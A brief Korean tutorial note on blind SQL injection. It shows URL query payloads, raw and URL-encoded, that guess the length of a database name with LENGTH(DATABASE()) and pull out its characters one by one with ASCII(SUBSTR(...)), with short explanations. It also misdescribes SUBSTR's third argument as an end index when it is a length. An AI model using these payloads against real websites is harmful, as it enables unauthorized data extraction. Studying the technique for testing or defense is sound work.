### 데이터베이스 이름 길이 추출

```sql
#길이 확인 - >,<로 대략적인 크기 유추 가능
URLQuery AND LENGTH(DATABASE()) < 5

#원본 형태
URLQuery AND LENGTH(DATABASE()) = 5

#URL 인코딩 후
URLQuery+AND+LENGTH(DATABASE())+%3D+5
```

- URL에 SQL 쿼리문이 존재하여 SQL Injection 시도
- 연산자에 부등호(<,>)를 이용하여 대략적인 데이터베이스 이름명의 길이를 유추 가능

### 데이터베이스 첫 이름 추출

```sql
#URL 인코딩 전
ASCII(SUBSTR(DATABASE(),1,1)) = 122

#URL 인코딩 후
ASCII(SUBSTR(DATABASE()%2C1%2C1))+%3D+122
```

- DATABASE() : 데이터베이스 이름 추출
- SUBSTR(문자열, 시작인덱스, 종료인덱스) : DATABASE() 함수의 반환값인 문자열의 일부분(한글자)만 추출
- ASICII(문자) : 추출한 문자를 아스키 코드 숫자로 변환하여 값을 확인
